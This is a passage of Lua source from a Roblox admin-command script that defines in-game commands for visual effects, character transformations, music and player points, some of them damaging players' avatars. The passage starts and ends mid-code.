local Part = Instance.new("Part")
Part.Parent = v.Character
local SpecialMesh = Instance.new("SpecialMesh") 
SpecialMesh.Parent = Part
SpecialMesh.MeshId = "http://www.roblox.com/asset/?id=2251534" 
SpecialMesh.MeshType = "FileMesh" 
SpecialMesh.TextureId = "43abb6d081e0fbc8666fc92f6ff378c1" 
SpecialMesh.Scale = Vector3.new(0.5,0.5,0.5)
local Weld = Instance.new("Weld")
Weld.Parent = Part
Weld.Part0 = Part
Weld.Part1 = v.Character.Torso
Weld.C0 = CFrame.new(0,-1,0)*CFrame.Angles(-1.5,0,0)
local BodyVelocity = Instance.new("BodyVelocity")
BodyVelocity.Parent = Part
BodyVelocity.maxForce = Vector3.new(math.huge,math.huge,math.huge)
BodyVelocity.velocity = Vector3.new(0,10*speed,0)
delay(0,function()
for i = 1,math.huge do
local Explosion = Instance.new("Explosion")
Explosion.Parent = Part
Explosion.BlastRadius = 0
Explosion.Position = Part.Position + Vector3.new(0,0,0)
wait()
end 
end)        
wait(3)
pcall(function()
BodyVelocity:remove()
Instance.new("Explosion",workspace).Position=v.Character.Torso.Position
v.Character:BreakJoints()
end)
end)
end
end)()
end
end)

set.MakeCommand('Make the target player(s) dance',-1,set.Prefix,{'dance'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	set.Remote(v,'Function','Effect','dance')
end
end)

set.MakeCommand('Make the target player(s) break dance',-1,set.Prefix,{'breakdance','fundance','lolwut'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function()
local color
local num=math.random(1,7)
if num==1 then
color='Really blue'
elseif num==2 then
color='Really red'
elseif num==3 then
color='Magenta'
elseif num==4 then
color='Lime green'
elseif num==5 then
color='Hot pink'
elseif num==6 then
color='New Yeller'
elseif num==7 then
color='White'
end
local hum=v.Character:FindFirstChild('Humanoid')
if not hum then return end
set.Remote(v,'Function','Effect','dance')
set.ProcessCommand(plr,set.Prefix.."batch"..set.SplitKey..set.Prefix.."sparkles"..set.SplitKey..v.Name..set.SplitKey..color..set.BatchSplit..set.Prefix.."fire"..set.SplitKey..v.Name..set.SplitKey..color..set.BatchSplit..set.Prefix.."nograv"..set.SplitKey..v.Name..set.BatchSplit..set.Prefix.."smoke"..set.SplitKey..v.Name..set.SplitKey..color..set.BatchSplit..set.Prefix.."spin"..set.SplitKey..v.Name)
repeat hum.PlatformStand=true wait() until not hum or hum==nil or hum.Parent==nil
end)()
end
end)

set.MakeCommand('Make the target player(s) puke',-1,set.Prefix,{'puke','barf','throwup','vomit'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1])) do
coroutine.wrap(function()
if (not v:IsA('Player')) or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head')) or v.Character:FindFirstChild('Kohls Puke') then return end
local run=true
local k=Instance.new('StringValue',v.Character)
k.Name='Kohls Puke'
coroutine.wrap(function()
repeat 
wait(0.15)
local p = Instance.new("Part",v.Character)
p.CanCollide = false
local color = math.random(1, 3)
local bcolor
if color == 1 then
bcolor = BrickColor.new(192)
elseif color == 2 then
bcolor = BrickColor.new(28)
elseif color == 3 then
bcolor = BrickColor.new(105)
end
p.BrickColor = bcolor
local m=Instance.new('BlockMesh',p)
p.Size=Vector3.new(0.1,0.1,0.1)
m.Scale = Vector3.new(math.random()*0.9, math.random()*0.9, math.random()*0.9)
p.Locked = true
p.TopSurface = "Smooth"
p.BottomSurface = "Smooth"
p.CFrame = v.Character.Head.CFrame * CFrame.new(Vector3.new(0, 0, -1))
p.Velocity = v.Character.Head.CFrame.lookVector * 20 + Vector3.new(math.random(-5, 5), math.random(-5, 5), math.random(-5, 5))
p.Anchored = false
m.Name='Puke Peice'
p.Name='Puke Peice'
p.Touched:connect(function(o)
if o and p and (not game:service('Players'):FindFirstChild(o.Parent.Name)) and o.Name~='Puke Peice' and o.Name~='Blood Peice' and o.Name~='Blood Plate' and o.Name~='Puke Plate' and (o.Parent.Name=='Workspace' or o.Parent:IsA('Model')) and (o.Parent~=p.Parent) and o:IsA('Part') and (o.Parent.Name~=v.Character.Name) and (not o.Parent:IsA('Hat')) and (not o.Parent:IsA('Tool')) then
	local cf=CFrame.new(p.CFrame.X,o.CFrame.Y+o.Size.Y/2,p.CFrame.Z)
	p:Destroy()
	local g=Instance.new('Part',workspace)
	g.Anchored=true
	g.CanCollide=false
	g.Size=Vector3.new(0.1,0.1,0.1)
	g.Name='Puke Plate'
	g.CFrame=cf
	g.BrickColor=BrickColor.new(119)
	local c=Instance.new('CylinderMesh',g)
	c.Scale=Vector3.new(1,0.2,1)
	c.Name='PukeMesh'
	wait(10)
	g:Destroy()
elseif o and o.Name=='Puke Plate' and p then 
	p:Destroy() 
	o.PukeMesh.Scale=o.PukeMesh.Scale+Vector3.new(0.5,0,0.5)
end
end)
until run==false or not k or not k.Parent or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head'))
end)()
wait(10)
run=false
k:Destroy()
end)()
end
end)

set.MakeCommand('Make the target player(s) bleed',-1,set.Prefix,{'cut','stab','shank'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
coroutine.wrap(function()
if (not v:IsA('Player')) or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head')) or v.Character:FindFirstChild('Kohls Bleed') then return end
local run=true
local k=Instance.new('StringValue',v.Character)
k.Name='Kohls Bleed'
coroutine.wrap(function()
repeat 
wait(0.15)
v.Character.Humanoid.Health=v.Character.Humanoid.Health-1
local p = Instance.new("Part",v.Character)
p.CanCollide = false
local color = math.random(1, 3)
local bcolo
if color == 1 then
bcolor = BrickColor.new(21)
elseif color == 2 then
bcolor = BrickColor.new(1004)
elseif color == 3 then
bcolor = BrickColor.new(21)
end
p.BrickColor = bcolor
local m=Instance.new('BlockMesh',p)
p.Size=Vector3.new(0.1,0.1,0.1)
m.Scale = Vector3.new(math.random()*0.9, math.random()*0.9, math.random()*0.9)
p.Locked = true
p.TopSurface = "Smooth"
p.BottomSurface = "Smooth"
p.CFrame = v.Character.Torso.CFrame * CFrame.new(Vector3.new(2, 0, 0))
p.Velocity = v.Character.Head.CFrame.lookVector * 1 + Vector3.new(math.random(-1, 1), math.random(-1, 1), math.random(-1, 1))
p.Anchored = false
m.Name='Blood Peice'
p.Name='Blood Peice'
p.Touched:connect(function(o)
if o and p and (not game:service('Players'):FindFirstChild(o.Parent.Name)) and o.Name~='Blood Peice' and o.Name~='Puke Peice' and o.Name~='Puke Plate' and o.Name~='Blood Plate' and (o.Parent.Name=='Workspace' or o.Parent:IsA('Model')) and (o.Parent~=p.Parent) and o:IsA('Part') and (o.Parent.Name~=v.Character.Name) and (not o.Parent:IsA('Hat')) and (not o.Parent:IsA('Tool')) then
	local cf=CFrame.new(p.CFrame.X,o.CFrame.Y+o.Size.Y/2,p.CFrame.Z)
	p:Destroy()
	local g=Instance.new('Part',workspace)
	g.Anchored=true
	g.CanCollide=false
	g.Size=Vector3.new(0.1,0.1,0.1)
	g.Name='Blood Plate'
	g.CFrame=cf
	g.BrickColor=BrickColor.new(21)
	local c=Instance.new('CylinderMesh',g)
	c.Scale=Vector3.new(1,0.2,1)
	c.Name='BloodMesh'
	wait(10)
	g:Destroy()
elseif o and o.Name=='Blood Plate' and p then 
	p:Destroy() 
	o.BloodMesh.Scale=o.BloodMesh.Scale+Vector3.new(0.5,0,0.5)
end
end)
until run==false or not k or not k.Parent or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head'))
end)()
wait(10)
run=false
k:Destroy()
end)()
end
end)

set.MakeCommand('Shows you the number of player points left in the game',5,set.Prefix,{'points','getpoints'},{},0,function(plr,args)
	set.Hint('Available Player Points: '..game:GetService("PointsService"):GetAwardablePoints(),{plr})
end)

set.MakeCommand('Lets you give <player> <amount> player points',5,set.Prefix,{'givepoints','sendpoints'},{'player','amount'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1]:lower())) do
		local ran,failed=ypcall(function() game:GetService("PointsService"):AwardPoints(v.userId,tonumber(args[2])) end)
		if ran and game:GetService("PointsService"):GetAwardablePoints()>=tonumber(args[2]) then
			set.Hint('Gave '..args[2]..' points to '..v.Name,{plr})
		elseif game:GetService("PointsService"):GetAwardablePoints()<tonumber(args[2])then
			set.Hint("You don't have "..args[2]..' points to give to '..v.Name,{plr})
		else
			set.Hint("(Unknown Error) Failed to give "..args[2]..' points to '..v.Name,{plr})
		end
		set.Hint('Available Player Points: '..game:GetService("PointsService"):GetAwardablePoints(),{plr})
	end
end)

set.MakeCommand('Slowly kills the target player(s)',-1,set.Prefix,{'poison'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1]:lower())) do
		local torso=v.Character:FindFirstChild('Torso')
		local larm=v.Character:FindFirstChild('Left Arm')
		local rarm=v.Character:FindFirstChild('Right Arm')
		local lleg=v.Character:FindFirstChild('Left Leg')
		local rleg=v.Character:FindFirstChild('Right Leg')
		local head=v.Character:FindFirstChild('Head')
		local hum=v.Character:FindFirstChild('Humanoid')
		if torso and larm and rarm and lleg and rleg and head and hum and not v.Character:FindFirstChild('KohlsPoisoned') then
			local poisoned=Instance.new('BoolValue',v.Character)
			poisoned.Name='KohlsPoisoned'
			poisoned.Value=true
			local tor=torso.BrickColor
			local lar=larm.BrickColor
			local rar=rarm.BrickColor
			local lle=lleg.BrickColor
			local rle=rleg.BrickColor
			local hea=head.BrickColor
			torso.BrickColor=BrickColor.new('Br. yellowish green')
			larm.BrickColor=BrickColor.new('Br. yellowish green')
			rarm.BrickColor=BrickColor.new('Br. yellowish green')
			lleg.BrickColor=BrickColor.new('Br. yellowish green')
			rleg.BrickColor=BrickColor.new('Br. yellowish green')
			head.BrickColor=BrickColor.new('Br. yellowish green')
			local run=true
			coroutine.wrap(function() wait(10) run=false end)()
			repeat
				wait(1)
				hum.Health=hum.Health-5
			until (not poisoned) or (not poisoned.Parent) or (not run)
			if poisoned and poisoned.Parent then
				torso.BrickColor=tor
				larm.BrickColor=lar
				rarm.BrickColor=rar
				lleg.BrickColor=lle
				rleg.BrickColor=rle
				head.BrickColor=hea
			end
		end
	end
end)

set.MakeCommand('Makes the target player(s) say interesting things, makes it hard for them to walk, and eventually kills them',-1,set.Prefix,{'drug','intoxicate'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		set.Remote(v,'Function','Drug')
	end
end)

set.MakeCommand('Change the pitch o the currently playing song',2,set.Prefix,{'pitch'},{'number'},1,function(plr,args)
coroutine.wrap(function()
local pitch = args[1]
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v.Pitch=pitch end end
end)()
end)

set.MakeCommand('Start playing a song',2,set.Prefix,{'music','song','playsong'},{'id'},1,function(plr,args)
coroutine.wrap(function()
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v:Destroy() end end
local id = args[1]:lower()
local pitch = 1
local mp = game:service('MarketplaceService')
local volume = 1
for i,v in pairs(set['MusicList']) do if id==v.Name:lower() then id=v.Id if v.Pitch then pitch=v.Pitch end if v.Volume then volume=v.Volume end end end
local name = 'Invalid ID '
pcall(function() if mp:GetProductInfo(id).AssetTypeId==3 then name = 'Now playing '..mp:GetProductInfo(id).Name end end)
local s = Instance.new("Sound") 
s.Name='Sound'..set.RemoteObject
s.Parent=workspace
s.SoundId = "http://www.roblox.com/asset/?id=" .. id 
s.Volume = volume 
s.Pitch = pitch 
s.Looped = true 
s.archivable = false
pcall(function() s:Play()end)
set.Hint(name..' ('..id..')',game:service('Players'):children())
end)()
end)

set.MakeCommand('Stop the currently playing song',2,set.Prefix,{'stopmusic','musicoff'},{},0,function(plr,args)
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v:Destroy() end end
end)

set.MakeCommand('Shows you the script\'s available music list',2,set.Prefix,{'musiclist','listmusic','songs'},{},0,function(plr,args)
local listforclient={}
for i, v in pairs(set['MusicList']) do 
table.insert(listforclient,v.Name)
end
--set.Remote(plr,'SetSetting','MusicList',listforclient)
set.Remote(plr,'Function','ListGui','Music List',listforclient)
end)

set.MakeCommand('Turns the target player(s) into a stick figure',-1,set.Prefix,{'stickify','stick','stickman'},{'player'},1,function(plr,args)
	local plrz = set.GetPlayers(plr, args[1]:lower())
	for kay, player in pairs(plrz) do
	coroutine.wrap(function()
	local m = player.Character
	for i,v in pairs(m:GetChildren()) do
	if v:IsA ("Part") then
	local s = Instance.new("SelectionPartLasso")
	s.Parent = m.Torso
	s.Part = v
	s.Humanoid = m.Humanoid
	s.Color = BrickColor.new(0,0,0)
	v.Transparency = 1
	m.Head.Transparency = 0
	m.Head.Mesh:Remove()
	local b = Instance.new("SpecialMesh")
	b.Parent = m.Head
	b.MeshType = "Sphere"
	b.Scale = Vector3.new(.5,1,1)
	m.Head.BrickColor = BrickColor.new("Black")
	end 
	end
	end)()
	end 
end)

set.MakeCommand('Sends the target player(s) down a hole',-1,set.Prefix,{'hole','sparta'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for kay, player in pairs(plrz) do
coroutine.wrap(function()
local torso=player.Character:FindFirstChild('Torso')
if torso then
local hole = Instance.new("Part",player.Character)
hole.Anchored = true
hole.CanCollide = false
hole.formFactor = Enum.FormFactor.Custom
hole.Size = Vector3.new(10,1,10)
hole.CFrame = torso.CFrame * CFrame.new(0,-3.3,-3)
hole.BrickColor = BrickColor.new("Really black")
local holeM = Instance.new("CylinderMesh",hole)
torso.Anchored = true
local foot = torso.CFrame * CFrame.new(0,-3,0)
for i=1,10 do
torso.CFrame = foot * CFrame.fromEulerAnglesXYZ(-(math.pi/2)*i/10,0,0) * CFrame.new(0,3,0)
wait()
end
for i=1,5,0.2 do
torso.CFrame = foot * CFrame.new(0,-(i^2),0) * CFrame.fromEulerAnglesXYZ(-(math.pi/2),0,0) * CFrame.new(0,3,0)
wait()
end
player.Character.Humanoid.Health=0
end
end)()
end
end)

set.MakeCommand('Crucifies the target players(s) (Old Roman punishment done to thousands of people, saying its offensive only means you are ignorant)',-1,set.Prefix,{'crucify','cross'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1]:lower())) do
		local torso=v.Character['Torso']
		local larm=v.Character['Left Arm']
		local rarm=v.Character['Right Arm']
		local lleg=v.Character['Left Leg']
		local rleg=v.Character['Right Leg']
		local head=v.Character['Head']
		if torso and larm and rarm and lleg and rleg and head and not v.Character:FindFirstChild(v.Name..'kohlscrusify') then
			local cru=Instance.new('Model',v.Character)
			cru.Name=v.Name..'kohlscrusify'
			local c1=Instance.new('Part',cru)
			c1.BrickColor=BrickColor.new('Reddish brown')
			c1.Material='Wood'
			c1.CFrame=(v.Character.Torso.CFrame-v.Character.Torso.CFrame.lookVector)*CFrame.new(0,0,2)
			c1.Size=Vector3.new(2,18.4,1)
			c1.Anchored=true
			local c2=c1:Clone()
			c2.Parent=cru
			c2.Size=Vector3.new(11,1.6,1)
			c2.CFrame=c1.CFrame+Vector3.new(0,5,0)
			torso.Anchored=true
			wait(0.5)
			torso.CFrame=c2.CFrame+torso.CFrame.lookVector+Vector3.new(0,-1,0)
			wait(0.5)
			larm.Anchored=true
			rarm.Anchored=true
			lleg.Anchored=true
			rleg.Anchored=true
			head.Anchored=true
			wait()
			larm.CFrame=torso.CFrame*CFrame.new(-1.5,1,0)
			rarm.CFrame=torso.CFrame*CFrame.new(1.5,1,0)
			lleg.CFrame=torso.CFrame*CFrame.new(-0.1,-1.7,0)
			rleg.CFrame=torso.CFrame*CFrame.new(0.1,-1.7,0)
			larm.CFrame=larm.CFrame*CFrame.Angles(0,0,-140)
			rarm.CFrame=rarm.CFrame*CFrame.Angles(0,0,140)
			lleg.CFrame=lleg.CFrame*CFrame.Angles(0,0,0.6)
			rleg.CFrame=rleg.CFrame*CFrame.Angles(0,0,-0.6)
			--head.CFrame=head.CFrame*CFrame.Angles(0,0,0.3)
			local n1=Instance.new('Part',cru)
			n1.BrickColor=BrickColor.new('Dark stone grey')
			n1.Material='DiamondPlate'
			n1.Size=Vector3.new(0.2,0.2,2)
			n1.Anchored=true
			local m=Instance.new('BlockMesh',n1)
			m.Scale=Vector3.new(0.2,0.2,0.7)
			n2=n1:clone()
			n2.Parent=cru
			n3=n1:clone()
			n3.Parent=cru
			n1.CFrame=(c2.CFrame+torso.CFrame.lookVector)*CFrame.new(2,0,0)
			n2.CFrame=(c2.CFrame+torso.CFrame.lookVector)*CFrame.new(-2,0,0)
			n3.CFrame=(c2.CFrame+torso.CFrame.lookVector)*CFrame.new(0,-3,0)
			coroutine.wrap(function()
				repeat 
					wait(0.1)
					v.Character.Humanoid.Health=v.Character.Humanoid.Health-0.6
					local p = Instance.new("Part",v.Character)
					p.CanCollide = false
					local color = math.random(1, 3)
					local bcolo
					if color == 1 then
						bcolor = BrickColor.new(21)
						parent=n1
					elseif color == 2 then
						bcolor = BrickColor.new(1004)
						parent=n2
					elseif color == 3 then
						bcolor = BrickColor.new(21)
						parent=n3
					end
					p.BrickColor = bcolor
					local m=Instance.new('BlockMesh',p)
					p.Size=Vector3.new(0.1,0.1,0.1)
					m.Scale = Vector3.new(math.random()*0.9, math.random()*0.9, math.random()*0.9)
					p.Locked = true
					p.TopSurface = "Smooth"
					p.BottomSurface = "Smooth"
					p.CFrame = parent.CFrame
					p.Anchored = false
					m.Name='Blood Peice'
					p.Name='Blood Peice'
					p.Touched:connect(function(o)
						if o and p and o~=parent and o~=n1 and o~=n2 and o~=n3 and o~=c1 and o~=c2 and o.Parent~=cru and (not game:service('Players'):FindFirstChild(o.Parent.Name)) and o.Name~='Blood Peice' and o.Name~='Puke Peice' and o.Name~='Puke Plate' and o.Name~='Blood Plate' and (o.Parent.Name=='Workspace' or o.Parent:IsA('Model')) and (o.Parent~=p.Parent) and o:IsA('Part') and (o.Parent.Name~=v.Character.Name) and (not o.Parent:IsA('Hat')) and (not o.Parent:IsA('Tool')) then
							local cf=CFrame.new(p.CFrame.X,o.CFrame.Y+o.Size.Y/2,p.CFrame.Z)
							p:Destroy()
							local g=Instance.new('Part',workspace)
							g.Anchored=true
							g.CanCollide=false
							g.Size=Vector3.new(0.1,0.1,0.1)
							g.Name='Blood Plate'
							g.CFrame=cf
							g.BrickColor=BrickColor.new(21)
							local c=Instance.new('CylinderMesh',g)
							c.Scale=Vector3.new(1,0.2,1)
							c.Name='BloodMesh'
							wait(10)
							g:Destroy()
						elseif o and o.Name=='Blood Plate' and p then 
							p:Destroy() 
							o.BloodMesh.Scale=o.BloodMesh.Scale+Vector3.new(1,0,1)
						end
					end)
				until (not cru) or (not cru.Parent) or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head')) or v.Character.Humanoid.Health<=0
			end)()
		end
	end
end)

set.MakeCommand('Lets the target player(s) fly',2,set.Prefix,{'fly','flight'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	set.Remote(v,'Function','Effect','fly')
end
end)

set.MakeCommand('Removes the target player(s)\'s ability to fly',2,set.Prefix,{'unfly','ground'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
	set.Remote(v,'Function','Effect','unfly')
end
end)

set.MakeCommand('Turns the place into a disco party',-1,set.Prefix,{'disco'},{},0,function(plr,args)
set.lighttask=false
wait(0.5)
coroutine.wrap(function()
set.lighttask = true
repeat
if set.lighttask==false then return end
local color = Color3.new(math.random(255)/255,math.random(255)/255,math.random(255)/255)
game:service('Lighting').Ambient = color
game:service('Lighting').OutdoorAmbient = color
game:service('Lighting').FogColor = color
wait(0.1)
until set.lighttask==false
end)()
end)

set.MakeCommand('Makes the place flash',-1,set.Prefix,{'flash'},{},0,function(plr,args)
set.lighttask=false
wait(0.5)
coroutine.wrap(function()
set.lighttask=true
repeat
if set.lighttask==false then return end
game:service('Lighting').Ambient = Color3.new(1,1,1)
game:service('Lighting').OutdoorAmbient = Color3.new(1,1,1)
game:service('Lighting').FogColor = Color3.new(1,1,1)
game:service('Lighting').Brightness = 1
game:service('Lighting').TimeOfDay = 14
wait(0.1) 
game:service('Lighting').Ambient = Color3.new(0,0,0)
game:service('Lighting').OutdoorAmbient = Color3.new(0,0,0)
game:service('Lighting').FogColor = Color3.new(0,0,0)
game:service('Lighting').Brightness = 0
game:service('Lighting').TimeOfDay = 0
wait(0.1)
until set.lighttask==false
end)()
end)

set.MakeCommand('Makes the target player(s) spin',-1,set.Prefix,{'spin'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for i,v in pairs(v.Character.Torso:children()) do if v.Name == "SPINNER" then v:Destroy() end end
local torso = v.Character:findFirstChild("Torso")
local bg = Instance.new("BodyGyro", torso) bg.Name = "SPINNER" bg.maxTorque = Vector3.new(0,math.huge,0) bg.P = 11111 bg.cframe = torso.CFrame table.insert(set.objects,bg)
repeat wait(1/44) bg.cframe = bg.cframe * CFrame.Angles(0,math.rad(30),0)
until not bg or bg.Parent ~= torso
end
end)()
end
end)

set.MakeCommand('Makes the target player(s) stop spinning',-1,set.Prefix,{'unspin'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for a,q in pairs(v.Character.Torso:children()) do if q.Name == "SPINNER" then q:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Turn the target player(s) into a dog',-1,set.Prefix,{'dog','dogify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
v.Character.Torso.Transparency = 1
v.Character.Torso.Neck.C0 = CFrame.new(0,-.5,-2) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(.5,-1.5,-1.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-.5,-1.5,-1.5) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1.5,-1,1.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1.5,-1,1.5) * CFrame.Angles(0,math.rad(-90),0)
local new = Instance.new("Seat", v.Character) new.Name = "FAKETORSO" new.formFactor = "Symmetric" new.TopSurface = 0 new.BottomSurface = 0 new.Size = Vector3.new(3,1,4) new.CFrame = v.Character.Torso.CFrame
local bf = Instance.new("BodyForce", new) bf.force = Vector3.new(0,new:GetMass()*196.25,0)
local weld = Instance.new("Weld", v.Character.Torso) weld.Part0 = v.Character.Torso weld.Part1 = new weld.C0 = CFrame.new(0,-.5,0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("Brown") elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("Brown") end end
end
end)()
end
end)

set.MakeCommand('Turn them back to normal',-1,set.Prefix,{'undog','undogify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("White") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("White") end end
end
end)()
end
end)

set.MakeCommand('Turn the target player(s) into a creeper',-1,set.Prefix,{'creeper','creeperify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("Bright green") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("Bright green") end end
end
end)()
end
end)

set.MakeCommand('Turn the target player(s) back to normal',-1,set.Prefix,{'uncreeper','uncreeperify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("White") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("White") end end
end
end)()
end
end)

set.MakeCommand('Give the target player(s) a larger ego',-1,set.Prefix,{'bighead'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then v.Character.Head.Mesh.Scale = Vector3.new(3,3,3) v.Character.Torso.Neck.C0 = CFrame.new(0,1.9,0) * CFrame.Angles(math.rad(90),math.rad(180),0) end
end)()
end
end)

set.MakeCommand('Resize the target player(s)\'s character by <number>',-1,set.Prefix,{'resize','size'},{'player','number'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
	 if not (v and v.Character and v.Character:findFirstChild('Torso') and v.Character:findFirstChild('HumanoidRootPart')) then return end
		local ags = {c = v.Character, t = v.Character.Torso, r = v.Character.HumanoidRootPart}
		ags.t.Anchored = true ags.t.BottomSurface = 0 ags.t.TopSurface = 0
		local welds = {} --Credit to Drezmor for the orig command, credit to Kohltastrophe for making it work correctly l0l
		for i2,v2 in pairs(ags.c:children()) do
		if v2:IsA('BasePart') then v2.Anchored = true
		elseif v2:IsA('Pants') or v2:IsA('Shirt') then v2.Parent = ags.t
		end
		end
		print(args[2])
		local function size(p)
		for i2,v2 in pairs(p:children()) do
		if v2:IsA('Weld') or v2:IsA('Motor') or v2:IsA('Motor6D') then
		local p1 = v2.Part1 p1.Anchored = true v2.Part1 = nil
		local r1,r2,r3,r4,r5,r6,r7,r8,r9,r10,r11,r12 = v2.C0:components() v2.C0 = CFrame.new(r1*args[2],r2*args[2],r3*args[2],r4,r5,r6,r7,r8,r9,r10,r11,r12)
		local r1,r2,r3,r4,r5,r6,r7,r8,r9,r10,r11,r12 = v2.C1:components() v2.C1 = CFrame.new(r1*args[2],r2*args[2],r3*args[2],r4,r5,r6,r7,r8,r9,r10,r11,r12)
		if p1.Name ~= 'Head' and p1.Name ~= 'Torso' then
		p1.formFactor = 3
		p1.Size = p1.Size*args[2]
		elseif p1.Name ~= 'Torso' then
		p1.Anchored = true
		for i3,v3 in pairs(p1:children()) do if v3:IsA('Weld') then v3.Part0 = nil v3.Part1.Anchored = true end end
		p1.formFactor = 3 p1.Size = p1.Size*args[2]
		for i3,v3 in pairs(p1:children()) do if v3:IsA('Weld') then v3.Part0 = p1 v3.Part1.Anchored = false end end
		end
		if v2.Parent == ags.t then p1.BottomSurface = 0 p1.TopSurface = 0 end
		p1.Anchored = false
		v2.Part1 = p1
